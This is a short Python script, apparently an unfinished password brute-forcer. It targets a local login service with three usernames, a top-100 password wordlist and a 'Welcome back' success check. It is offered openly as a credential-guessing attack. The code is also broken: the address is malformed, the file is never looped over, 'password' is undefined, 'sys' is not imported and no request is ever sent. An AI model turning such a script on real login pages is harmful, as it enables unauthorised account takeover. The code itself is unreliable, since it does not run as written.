import requests

target = "127.0.01:5000"
usernames = ["admin", "user", "test"]
passwords = "top-100.txt"
needle= "Welcome back"

for username in usernames:
    with open (passwords, "r") as passwords_list:
        password = password.strip("\n").encode()
        sys.stdout.write("[X]) Attempting user:password -> {}:{}\r ".format(username, password.decode()))